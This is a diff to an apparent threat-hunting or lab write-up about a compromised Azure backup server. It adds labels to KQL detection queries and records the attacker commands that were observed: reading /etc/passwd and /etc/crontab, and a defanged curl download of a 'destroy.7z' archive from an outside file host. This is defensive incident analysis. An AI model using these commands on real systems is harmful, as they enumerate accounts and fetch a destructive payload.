@@ -91,8 +91,9 @@ DeviceProcessEvents
 #### **FLAG 6: DISCOVERY - Account Enumeration**
 - Findings: Attackers enumerate local accounts to understand the system's user base.
 - Reference: [T1087.001: Account Discovery - Local Account](https://attack.mitre.org/techniques/T1087/001/)  
-- xxxxxxxxxxxxx
+- `cat /etc/passwd`
 
+**KQL Query: Find when the passwd file has been read**
 ```SQL
 DeviceProcessEvents
 | where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
@@ -109,7 +110,7 @@ DeviceProcessEvents
 - Reference: [T1083: File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)  
 - ``cat /etc/crontab``
 
-
+**KQL Query: Find when cronjobs were viewed**
 ```SQL
 DeviceProcessEvents
 | where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
@@ -128,6 +129,7 @@ DeviceProcessEvents
 - `curl -L -o destroy.7z hxxps[://]litter[.]catbox[.]moe/io523y[.]7z`
 - https://www.virustotal.com/gui/url/d12a94f339b357c09e832e5739eae474e2c24dfcd18c9c822ec09f2c917010bb?nocache=1
 
+**KQL Query: Find when the passwd file has been read**
 ```SQL
 DeviceProcessEvents
 | where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
